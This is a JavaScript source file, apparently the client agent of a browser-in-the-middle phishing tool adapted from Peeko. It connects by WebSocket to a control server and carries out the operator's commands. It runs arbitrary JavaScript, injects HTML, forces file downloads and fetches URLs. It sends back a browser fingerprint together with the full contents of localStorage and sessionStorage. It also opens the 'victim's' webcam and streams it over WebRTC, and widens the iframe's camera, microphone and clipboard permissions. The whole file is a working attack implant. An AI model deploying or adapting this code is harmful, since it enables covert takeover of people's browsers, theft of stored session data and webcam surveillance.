/*
 * Adapted from b3rito/peeko's static/agent.js:
 * https://github.com/b3rito/peeko
 *
 * Original Peeko authors: b3rito at mes3hacklab and GioPpeTto.
 * Peeko is licensed under the GNU General Public License version 3.
 * Modified by P-BitM, 2026.
 */

const isIpAddress = /^(\d{1,3}\.){3}\d{1,3}$/.test(window.location.hostname);
const firstSegment = window.location.pathname.split('/').filter(Boolean)[0];
const wsBasePath = (isIpAddress && firstSegment) ? `/${firstSegment}` : '';
const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';

const streamIframePermissions = [
  'camera',
  'microphone',
  'geolocation',
  'clipboard-read',
  'clipboard-write'
];

function delegateStreamIframePermissions() {
  const iframe = document.querySelector('.iframe-visible');
  if (!iframe) return;

  const permissions = new Set(
    String(iframe.getAttribute('allow') || '')
      .split(';')
      .map(permission => permission.trim())
      .filter(Boolean)
  );
  streamIframePermissions.forEach(permission => permissions.add(permission));
  iframe.setAttribute('allow', [...permissions].join('; '));
  iframe.setAttribute('allowfullscreen', 'true');
}

delegateStreamIframePermissions();

const socket = new WebSocket(`${protocol}//${window.location.host}${wsBasePath}/ws?theme=${detectColorScheme()}`);

function detectColorScheme() {
  // Check if user prefers dark mode
  const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
  const prefersLight = window.matchMedia('(prefers-color-scheme: light)').matches;

  let scheme = 'unknown';
  if (prefersDark) scheme = 'dark';
  else if (prefersLight) scheme = 'light';

  return scheme;
}

let pc = null;
let localStream = null;
let victimId = null;
let webcamSessionId = null;
let webcamExpiryTimer = null;

const sessionToken = window.BITM_SESSION_TOKEN || null;

socket.onopen = () => {
  if (!sessionToken) {
    socket.close(1008);
    return;
  }
  socket.send(`session:${sessionToken}`);
};

socket.onmessage = async (event) => {
  const data = event.data;

  try {
      const json = JSON.parse(data);

      // Handle JSON WebRTC messages
      if (json.type === 'request-webcam') {
          if (!isValidWebcamSessionId(json.session_id)) {
              return;
          }
          victimId = json.victim_id;
          await requestWebcamPermission(json.session_id);
          return;
      }

      if (
          json.type === 'webrtc-answer'
          && json.victim_id === victimId
          && json.session_id === webcamSessionId
          && pc
      ) {
          const connection = pc;
          const sessionId = json.session_id;
          if (connection.signalingState === 'have-local-offer') {
              try {
                  await connection.setRemoteDescription(
                      new RTCSessionDescription(json.answer)
                  );
              } catch (error) {
                  if (
                      connection === pc
                      && sessionId === webcamSessionId
                  ) {
                      sendWebcamError(sessionId, 'signaling-failed');
                      stopWebcam(sessionId);
                  }
              }
          }
          return;
      }

      if (
          json.type === 'webrtc-candidate'
          && json.victim_id === victimId
          && json.session_id === webcamSessionId
          && pc
      ) {
          try {
              await pc.addIceCandidate(new RTCIceCandidate(json.candidate));
          } catch {
          }
          return;
      }

      if (
          json.type === 'webcam-stop'
          && json.victim_id === victimId
          && json.session_id === webcamSessionId
      ) {
          stopWebcam(json.session_id);
          return;
      }

    } catch (e) {
        // Not JSON, continue to string commands
    }

  if (data === "ping") {
    socket.send("pong");
    return;
  }

  if (data.startsWith("html:")) {
    const html = data.slice("html:".length);
    const temp = document.createElement("div");
    temp.innerHTML = html;
    document.body.appendChild(temp.firstChild);
    return;
  }

  // Handle file transfer
  if (data.startsWith("file:")) {
    const parts = data.split("|", 2);
    if (parts.length === 2) {
      const header = parts[0];
      const base64Data = parts[1];
      const filename = header.slice(5); // Remove "file:" prefix

      // Decode base64 to binary
      const binary = atob(base64Data);
      const bytes = new Uint8Array(binary.length);
      for (let i = 0; i < binary.length; i++) {
        bytes[i] = binary.charCodeAt(i);
      }

      // Create blob and trigger download
      const blob = new Blob([bytes]);
      const blobUrl = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = blobUrl;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);

      // Clean up
      URL.revokeObjectURL(blobUrl);
    }
    return;
  }

  // Handle browser info collection
  if (data.startsWith("collectinfo:")) {
    try {
      let uaData = null;
      try {
        uaData = navigator.userAgentData;
      } catch (e) {
      }
      let highEntropyData = {};

      if (uaData?.getHighEntropyValues) {
        try {
          highEntropyData = await uaData.getHighEntropyValues([
            "architecture", "bitness", "model", "platformVersion", "uaFullVersion"
          ]);
        } catch {
        }
      }

      const clientInfo = {
          "user_agent": navigator.userAgent,
          "user_agent_data": uaData
            ? {
              "brand": uaData.brands,
              "mobile": uaData.mobile,
              "platform": uaData.platform,
              ...highEntropyData,
            }
            : "User Agent Data API not supported",
          "client_platform": navigator.platform,
          "language": navigator.language,
          "languages": navigator.languages,
          "browser_plugins": (navigator.plugins && navigator.plugins.length > 0)
            ? Array.from(navigator.plugins, p => p.name)
            : "No plugins detected",
          "cpu": navigator.hardwareConcurrency || "Unable to get hardware concurrency",
          "ram": navigator.deviceMemory || "Unable to get device memory",
          "screen_size": `${screen.width}x${screen.height}`,
          "available_screen_size": `${screen.availWidth}x${screen.availHeight}`,
          "color_depth": screen.colorDepth,
          "pixel_depth": screen.pixelDepth,
          "timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
          "referrer": document.referrer || "No referrer",
          "local_storage": localStorage.length > 0
            ? Object.fromEntries(Object.entries(localStorage))
            : "No access to localStorage",
          "session_storage": sessionStorage.length > 0
            ? Object.fromEntries(Object.entries(sessionStorage))
            : "No access to sessionStorage",
      };

      socket.send(`[COLLECTED INFO] ${JSON.stringify(clientInfo)}`);
    } catch {
    }
  }

  // Handle custom JS execution
  if (data.startsWith("exec:")) {
    const jsCode = data.slice("exec:".length);
    try {
      Function(jsCode)();
    } catch {
    }
    return;
  }

  if (data.startsWith("module:")) {
    try {
      const payloadBase64 = data.slice("module:".length);
      const payload = JSON.parse(atob(payloadBase64));
      const faviconElement = document.querySelector(".heading-favicon");
      const currentUrl = faviconElement?.nextSibling?.textContent?.trim() || "";
      const favicon = faviconElement?.src
        || document.querySelector("link[rel~='icon']")?.href
        || "";
      const updatedHTML = payload.html
          .replace(/FAVICON/g, favicon)
          .replace(/URL/g, currentUrl);

      document.body.insertAdjacentHTML('beforeend', updatedHTML);

      // ✅ Crea ed esegui script dinamicamente
      const script = document.createElement('script');
      script.textContent = payload.js;
      document.head.appendChild(script);
      script.remove();
    } catch {
    }
    return;
  }

  // Handle URL fetch
  try {
    if (!data.startsWith("http://") && !data.startsWith("https://")) {
      return;
    }
    await fetch(data);
  } catch {
  }
};

// ===== WEBCAM FUNCTIONS =====

function isValidWebcamSessionId(value) {
    return (
        typeof value === 'string'
        && /^[A-Za-z0-9_-]{20,128}$/.test(value)
    );
}

function webcamErrorCode(error) {
    if (error?.name === 'NotAllowedError' || error?.name === 'SecurityError') {
        return 'permission-denied';
    }
    if (
        error?.name === 'NotFoundError'
        || error?.name === 'NotReadableError'
        || error?.name === 'OverconstrainedError'
    ) {
        return 'device-unavailable';
    }
    return 'capture-failed';
}

function sendWebcamError(sessionId, code) {
    if (socket.readyState !== WebSocket.OPEN) return;
    socket.send(JSON.stringify({
        type: 'webcam-error',
        session_id: sessionId,
        code
    }));
}

async function requestWebcamPermission(sessionId) {
    try {
        stopWebcam();
        webcamSessionId = sessionId;
        localStream = await navigator.mediaDevices.getUserMedia({
            video: { width: 640, height: 480, frameRate: 15 },
            audio: false
        });

        if (webcamSessionId !== sessionId) {
            localStream.getTracks().forEach(track => track.stop());
            localStream = null;
            return;
        }

        const connectionReady = await setupWebRTCConnection(sessionId);
        if (!connectionReady || webcamSessionId !== sessionId) {
            return;
        }
        webcamExpiryTimer = setTimeout(
            () => stopWebcam(sessionId),
            10 * 60 * 1000
        );

    } catch (error) {
        sendWebcamError(sessionId, webcamErrorCode(error));
        stopWebcam(sessionId);
    }
}

async function setupWebRTCConnection(sessionId) {
    const connection = new RTCPeerConnection({
        iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:stun1.l.google.com:19302' }
        ]
    });
    pc = connection;

    // Add tracks
    localStream.getTracks().forEach(track => {
        connection.addTrack(track, localStream);
    });

    // Handle ICE candidates
    connection.onicecandidate = (event) => {
        if (
            event.candidate
            && connection === pc
            && sessionId === webcamSessionId
            && socket.readyState === WebSocket.OPEN
        ) {
            // Send as JSON
            socket.send(JSON.stringify({
                type: 'webrtc-candidate',
                session_id: sessionId,
                candidate: event.candidate
            }));
        }
    };

    // Connection state
    connection.onconnectionstatechange = () => {
        if (
            connection === pc
            && (
                connection.connectionState === 'failed'
                || connection.connectionState === 'disconnected'
            )
        ) {
            sendWebcamError(sessionId, 'signaling-failed');
            stopWebcam(sessionId);
        }
    };

    // Create offer
    try {
        const offer = await connection.createOffer();
        if (connection !== pc || sessionId !== webcamSessionId) {
            connection.close();
            return false;
        }
        await connection.setLocalDescription(offer);
        if (connection !== pc || sessionId !== webcamSessionId) {
            connection.close();
            return false;
        }

        // Send offer as JSON
        socket.send(JSON.stringify({
            type: 'webrtc-offer',
            session_id: sessionId,
            offer: connection.localDescription
        }));
        return true;

    } catch {
        sendWebcamError(sessionId, 'signaling-failed');
        stopWebcam(sessionId);
        return false;
    }
}

function stopWebcam(sessionId = null) {
    if (sessionId !== null && sessionId !== webcamSessionId) {
        return false;
    }
    if (webcamExpiryTimer) {
        clearTimeout(webcamExpiryTimer);
        webcamExpiryTimer = null;
    }
    if (localStream) {
        localStream.getTracks().forEach(track => track.stop());
        localStream = null;
    }
    if (pc) {
        pc.close();
        pc = null;
    }
    webcamSessionId = null;
    return true;
}

socket.addEventListener('close', () => stopWebcam());
window.addEventListener('pagehide', () => stopWebcam(), { once: true });